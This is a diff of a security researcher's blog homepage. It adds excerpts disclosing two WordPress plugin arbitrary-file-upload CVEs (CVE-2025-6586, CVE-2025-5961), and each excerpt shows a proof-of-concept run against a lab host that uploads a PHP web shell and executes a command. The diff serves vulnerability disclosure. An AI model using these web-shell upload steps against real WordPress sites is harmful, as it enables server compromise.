@@ -74,7 +74,7 @@
 <meta property="og:url" content="https://ryankozak.com/" />
 
 
-<meta property="og:updated_time" content="2025-06-17T00:00:12Z" />
+<meta property="og:updated_time" content="2025-07-03T00:00:00Z" />
 
 
 <link rel="sitemap" type="application/xml" title="Sitemap" href='https://ryankozak.com/sitemap.xml' />
@@ -97,13 +97,13 @@
 
 
 
-<meta name="generator" content="Hugo 0.147.5">
+<meta name="generator" content="Hugo 0.147.9">
 
 
     
     
 
-<link type="text/css" rel="stylesheet" href="/css/bundle.min.83e62ffab51965100bce1b9fdbe396cf82f82d325af9178689d614757681c343.css">
+<link type="text/css" rel="stylesheet" href="/css/bundle.min.1c6f56a6497e1d68469eb2a7efcf2b145601a94408f411014a7af5ffc3a73522.css">
 
 
     
@@ -149,41 +149,37 @@
     }
 </style>
 
-
-
     
 <script type="application/ld+json">
 {
   "@context": "https://schema.org",
   "@type":  "Person",
   "@id":    "https:\/\/ryankozak.com\/#ryan-kozak",
-  "name":   "Ryan Kozak",
-  "jobTitle": "Offensive Security Researcher",
-  "description": "Offensive security engineer and researcher, specialising in web, linux, and other things interesting at the time.",
-  "alumniOf": "California State University Sacramento",
+  "name":   "",
+  "jobTitle": "",
   "url":    "https:\/\/ryankozak.com\/",
-  "image":  "\/images\/ryan‑kozak.jpg",
+  "image":  "",
   "sameAs": [
-      "https:\/\/github.com\/d0n601",
-      "https:\/\/www.linkedin.com\/in\/ryan‑kozak\/",
-      "https:\/\/twitter.com\/d0n601",
-      "https://www.wordfence.com/threat-intel/vulnerabilities/researchers/ryan-kozak",
-      "https://patchstack.com/database/researcher/ed9aaed9-ca13-413a-a5e3-af97095a4252"
+      "",
+      "",
+      ""
   ]
 }
 </script>
-
-    
 <script type="application/ld+json">
-    {
-      "@context":  "https://schema.org",
-      "@type":     "WebSite",
-      "@id":       "https:\/\/ryankozak.com\/#website",
-      "url":       "https:\/\/ryankozak.com\/",
-      "name":      "Ryan Kozak",
-      "publisher": { "@id": "https:\/\/ryankozak.com\/#ryan-kozak" },
-      "author": "Ryan Kozak",
-    }
+{
+  "@context":  "https://schema.org",
+  "@type":     "WebSite",
+  "@id":       "https:\/\/ryankozak.com\/#website",
+  "url":       "https:\/\/ryankozak.com\/",
+  "name":      "Ryan Kozak",
+  "publisher": { "@id": "https:\/\/ryankozak.com\/#ryan-kozak" },
+  "potentialAction": {
+    "@type": "SearchAction",
+    "target": "https:\/\/ryankozak.com\/search/?q={search_term_string}",
+    "query-input": "required name=search_term_string"
+  }
+}
 </script>
 </head>
 
@@ -267,6 +263,14 @@
                         </li>
                         
                             <li class="bullet">
+                                <a href="https://ryankozak.com/posts/cve-2025-6586/">Download Plugin &lt;= 2.2.8 - Authenticated (Admin&#43;) Arbitrary File Upload via the dpwap_plugin_locInstall Function</a>
+                            </li>
+                        
+                            <li class="bullet">
+                                <a href="https://ryankozak.com/posts/cve-2025-5961/">Migration, Backup, Staging – WPvivid Backup &amp; Migration &lt;= 0.9.116 - Authenticated (Administrator&#43;) Arbitrary File Upload</a>
+                            </li>
+                        
+                            <li class="bullet">
                                 <a href="https://ryankozak.com/posts/cve-2025-6220/">Ultimate Addons for Contact Form 7 &lt;= 3.5.12 - Authenticated (Administrator&#43;) Arbitrary File Upload via save_options</a>
                             </li>
                         
@@ -276,14 +280,6 @@
                         
                             <li class="bullet">
                                 <a href="https://ryankozak.com/posts/cve-2025-4603/">eMagicOne Store Manager for WooCommerce &lt;= 1.2.5 - Unauthenticated Arbitrary File Delete</a>
-                            </li>
-                        
-                            <li class="bullet">
-                                <a href="https://ryankozak.com/posts/cve-2025-4602/">eMagicOne Store Manager for WooCommerce &lt;= 1.2.5 - Unauthenticated Arbitrary File Read</a>
-                            </li>
-                        
-                            <li class="bullet">
-                                <a href="https://ryankozak.com/posts/cve-2025-4336/">eMagicOne Store Manager for WooCommerce &lt;= 1.2.5- Unauthenticated Arbitrary File Upload via set_file Task</a>
                             </li>
                         
                     
@@ -361,6 +357,181 @@
                 <div class="posts">
     
     
+    <article class="post">
+        <div class="info">
+  <h1 class="post-title">
+    <a href="https://ryankozak.com/posts/cve-2025-6586/">Download Plugin &lt;= 2.2.8 - Authenticated (Admin&#43;) Arbitrary File Upload via the dpwap_plugin_locInstall Function</a>
+  </h1>
+
+  <div class="headline">
+    <div>
+      
+      
+      <time datetime=" 2025-07-03T00:00:00Z" class="post-date">
+        July 3, 2025
+      </time>
+      
+      <span> - </span>
+      <span class="reading-time">
+        
+          
+        
+
+        <span>3 mins read</span>
+      </span>
+    </div>
+
+    
+  </div>
+
+  
+  
+
+  
+</div>
+
+        
+        <h3 id="cve-2025-6586">CVE-2025-6586</h3>
+<p>The <a href="https://wordpress.org/plugins/download-plugin/" target="_blank">Download Plugin</a> does not sanitize the file types of the <code>dpwap_plugin_locInstall</code> function
+exposed via the <code>mul_upload</code> admin page, allowing administrators or above to upload arbitrary files and
+potentially gain code execution on the server.</p>
+<h2 id="tldr-exploits">TL;DR Exploits</h2>
+<p>A POC <a href="https://github.com/d0n601/CVE-2025-6586/blob/master/cve-2025-6586.py" target="_blank">cve-2025-6586.py</a> is provided to demonstrate an administrator uploading a web shell named <code>shell.php</code>.</p>
+<pre tabindex="0"><code>python3 cve-2025-6586.py https://lab1.hacker admin PASSWORD
+Logging into: https://lab1.hacker/wp-admin
+Extracting nonce values...
+Uploading web shell: shell.php
+Web Shell Location: https://lab1.hacker/wp-
+content/uploads/dpwap_logs/files/tmp/shell.php
+
+Executing test command: ip addr
+    &lt;pre&gt;1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN
+group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+        valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host
+        valid_lft forever preferred_lft forever
+2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP
+group default qlen 1000
+    link/ether 08:00:27:5b:34:2f brd ff:ff:ff:ff:ff:ff
+    altname enp0s3
+    inet 10.0.2.15/24 metric 100 brd 10.0.2.255 scope global dynamic eth0
+v       alid_lft 75221sec preferred_lft 75221sec
+    inet6 fd17:625c:f037:2:a00:27ff:fe5b:342f/64 scope global dynamic
+mngtmpaddr noprefixroute
+        valid_lft 86354sec preferred_lft 14354sec
+    inet6 fe80::a00:27ff:fe5b:342f/64 scope link
+        valid_lft forever preferred_lft forever
+3: eth1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP
+group default qlen 1000
+    link/ether 08:00:27:39:ea:eb brd ff:ff:ff:ff:ff:ff
+    altname enp0s8
+    inet 192.168.56.56/24 brd 192.168.56.255 scope global eth1
+        valid_lft forever preferred_lft forever
+    inet6 fe80::a00:27ff:fe39:eaeb/64 scope link
+        valid_lft forever preferred_lft forever
+4: docker0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue
+state DOWN group default
+    link/ether 02:42:77:47:94:a5 brd ff:ff:ff:ff:ff:ff
+    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
+        valid_lft forever preferred_lft forever
+&lt;/pre&gt;
+</code></pre><h2 id="details">Details</h2>
+<p>The <code>dpwap_plugin_multiple_upload_func</code> function is exposed in the <code>mul_upload</code> admin page. On line <a href="https://plugins.trac.wordpress.org/browser/download-plugin/trunk/app/Plugins/Base.php#L80" target="_blank">80</a> of <code>/wp-content/plugins/download-plugin/app/Plugins/Base.php</code> the function includes <a href="https://plugins.trac.wordpress.org/browser/download-plugin/trunk/app/Plugins/templates/multiple_upload_plugin.php" target="_blank">multiple_upload_plugin.php</a>.</p>
+        
+        <div class="read-more-link">
+            <a href="/posts/cve-2025-6586/">Read More…</a>
+        </div>
+        
+        
+    </article>
+    <article class="post">
+        <div class="info">
+  <h1 class="post-title">
+    <a href="https://ryankozak.com/posts/cve-2025-5961/">Migration, Backup, Staging – WPvivid Backup &amp; Migration &lt;= 0.9.116 - Authenticated (Administrator&#43;) Arbitrary File Upload</a>
+  </h1>
+
+  <div class="headline">
+    <div>
+      
+      
+      <time datetime=" 2025-07-02T00:00:00Z" class="post-date">
+        July 2, 2025
+      </time>
+      
+      <span> - </span>
+      <span class="reading-time">
+        
+          
+        
+
+        <span>3 mins read</span>
+      </span>
+    </div>
+
+    
+  </div>
+
+  
+  
+
+  
+</div>
+
+        
+        <h3 id="cve-2025-5961">CVE-2025-5961</h3>
+<p>The <a href="https://wordpress.org/plugins/wpvivid-backuprestore/" target="_blank">wpvivid-backuprestore</a> plugin does not sanitize the file types of the <code>wpvivid_upload_import_files</code> action, allowing administrators or above to upload arbitrary files and potentially gain code execution on the server. NOTE: Uploaded files are only accessible on WordPress instances running on the NGINX web server as the existing .htaccess within the target file upload folder prevents access on Apache servers.</p>
+<h2 id="tldr-exploits">TL;DR Exploits</h2>
+<ul>
+<li>A POC <a href="https://github.com/d0n601/CVE-2025-5961/blob/master/CVE-2025-5961.py" target="_blank">CVE-2025-5961.py</a> is provided to demonstrate an administrator uploading a web shell named <code>hack.php</code>.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span> python3 ./CVE-2025-5961.py https://lab1.hacker admin password
+</span></span><span style="display:flex;"><span>Logging into: https://lab1.hacker/wp-admin
+</span></span><span style="display:flex;"><span>Extracting nonce values...
+</span></span><span style="display:flex;"><span>ajax_nonce: e4d4bec9f0
+</span></span><span style="display:flex;"><span>Uploading web shell: hack.php
+</span></span><span style="display:flex;"><span>{&#34;result&#34;:&#34;success&#34;}
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Web Shell At: https://lab1.hacker/wp-content/wpvividbackups/ImportandExport/hack.php
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Executing test command: ip addr
+</span></span><span style="display:flex;"><span>&lt;pre&gt;1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+</span></span><span style="display:flex;"><span>    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+</span></span><span style="display:flex;"><span>    inet 127.0.0.1/8 scope host lo
+</span></span><span style="display:flex;"><span>       valid_lft forever preferred_lft forever
+</span></span><span style="display:flex;"><span>    inet6 ::1/128 scope host 
+</span></span><span style="display:flex;"><span>       valid_lft forever preferred_lft forever
+</span></span><span style="display:flex;"><span>2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000
+</span></span><span style="display:flex;"><span>    link/ether 08:00:27:5b:34:2f brd ff:ff:ff:ff:ff:ff
+</span></span><span style="display:flex;"><span>    altname enp0s3
+</span></span><span style="display:flex;"><span>    inet 10.0.2.15/24 metric 100 brd 10.0.2.255 scope global dynamic eth0
+</span></span><span style="display:flex;"><span>       valid_lft 78309sec preferred_lft 78309sec
+</span></span><span style="display:flex;"><span>    inet6 fd00::a00:27ff:fe5b:342f/64 scope global dynamic mngtmpaddr noprefixroute 
+</span></span><span style="display:flex;"><span>       valid_lft 86105sec preferred_lft 14105sec
+</span></span><span style="display:flex;"><span>    inet6 fe80::a00:27ff:fe5b:342f/64 scope link 
+</span></span><span style="display:flex;"><span>       valid_lft forever preferred_lft forever
+</span></span><span style="display:flex;"><span>3: eth1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000
+</span></span><span style="display:flex;"><span>    link/ether 08:00:27:39:ea:eb brd ff:ff:ff:ff:ff:ff
+</span></span><span style="display:flex;"><span>    altname enp0s8
+</span></span><span style="display:flex;"><span>    inet 192.168.56.56/24 brd 192.168.56.255 scope global eth1
+</span></span><span style="display:flex;"><span>       valid_lft forever preferred_lft forever
+</span></span><span style="display:flex;"><span>    inet6 fe80::a00:27ff:fe39:eaeb/64 scope link 
+</span></span><span style="display:flex;"><span>       valid_lft forever preferred_lft forever
+</span></span><span style="display:flex;"><span>4: docker0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default 
+</span></span><span style="display:flex;"><span>    link/ether 02:42:63:2d:a4:f2 brd ff:ff:ff:ff:ff:ff
+</span></span><span style="display:flex;"><span>    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
+</span></span><span style="display:flex;"><span>       valid_lft forever preferred_lft forever
+</span></span><span style="display:flex;"><span>&lt;/pre&gt;
+</span></span></code></pre></div><h2 id="details">Details</h2>
+<p>The <code>wpvivid_upload_import_files</code> action calls the <code>upload_files</code> function on line <a href="https://plugins.trac.wordpress.org/browser/wpvivid-backuprestore/trunk/includes/class-wpvivid-export-import.php#L2210" target="_blank">2210</a> of <code>/wp-content/plugins/wpvivid-backuprestore/includes/class-wpvivid-export-import.php</code> without enforcing any file type validation.</p>
+        
+        <div class="read-more-link">
+            <a href="/posts/cve-2025-5961/">Read More…</a>
+        </div>
+        
+        
+    </article>
     <article class="post">
         <div class="info">
   <h1 class="post-title">
@@ -872,92 +1043,6 @@
         
         <div class="read-more-link">
             <a href="/posts/cve-2024-13869/">Read More…</a>
-        </div>
-        
-        
-    </article>
-    <article class="post">
-        <div class="info">
-  <h1 class="post-title">
-    <a href="https://ryankozak.com/posts/cve-2024-9162/">All-in-One WP Migration and Backup &lt;= 7.86 - Authenticated (Administrator&#43;) Arbitrary PHP Code Injection</a>
-  </h1>
-
-  <div class="headline">
-    <div>
-      
-      
-      <time datetime=" 2024-10-27T05:18:12Z" class="post-date">
-        October 27, 2024
-      </time>
-      
-      <span> - </span>
-      <span class="reading-time">
-        
-          
-        
-
-        <span>3 mins read</span>
-      </span>
-    </div>
-
-    
-  </div>
-
-  
-  
-
-  
-</div>
-
-        
-        <p>Around the time Def Con was happening this year I was sitting at home feeling left out. That made me feel hacky, but I don&rsquo;t get the same joy from CTFs at the moment that I used to. So, I decided to start hunting for CVEs. That lead to finding <a href="https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/all-in-one-wp-migration/all-in-one-wp-migration-and-backup-786-authenticated-administrator-arbitrary-php-code-injection" target="_blank">CVE-2024-9162</a>, which was just released today, along with the idea for a larger project that has resulted in a few more vulnerabilities yet to be disclosed.</p>
-        
-        <div class="read-more-link">
-            <a href="/posts/cve-2024-9162/">Read More…</a>
-        </div>
-        
-        
-    </article>
-    <article class="post">
-        <div class="info">
-  <h1 class="post-title">
-    <a href="https://ryankozak.com/posts/hack-the-box-armageddon-writeup/">Hack the Box Armageddon Writeup</a>
-  </h1>
-
-  <div class="headline">
-    <div>
-      
-      
-      <time datetime=" 2021-07-24T16:46:43-0700" class="post-date">
-        July 24, 2021
-      </time>
-      
-      <span> - </span>
-      <span class="reading-time">
-        
-          
-        
-
-        <span>8 mins read</span>
-      </span>
-    </div>
-
-    
-  </div>
-
-  
-  
-
-  
-</div>
-
-        
-        <p><img src="/posts/images/hack-the-box-armageddon-writeup/badge.png" alt="badge"></p>
-<h1 id="introduction">Introduction</h1>
-<p>Armageddon is an Easy level box, and it was about as standard as standard can be. The initial foothold was straight a forward Drupal exploit, and the name of the box is a massive hint (<em><a href="https://www.exploit-db.com/exploits/44449" target="_blank">Druppalgeddon2</a></em>). After gaining the initial foothold, enumerating MySQL and credential stuffing gains us user privileges. All of this is pretty basic. The privilege escalation is achieved through <em><a href="https://gtfobins.github.io/gtfobins/snap/" target="_blank">snap</a></em>, which was interesting to me since I&rsquo;d never done this before. It was not difficult to identify or exploit though.</p>
-        
-        <div class="read-more-link">
-            <a href="/posts/hack-the-box-armageddon-writeup/">Read More…</a>
         </div>
         
         
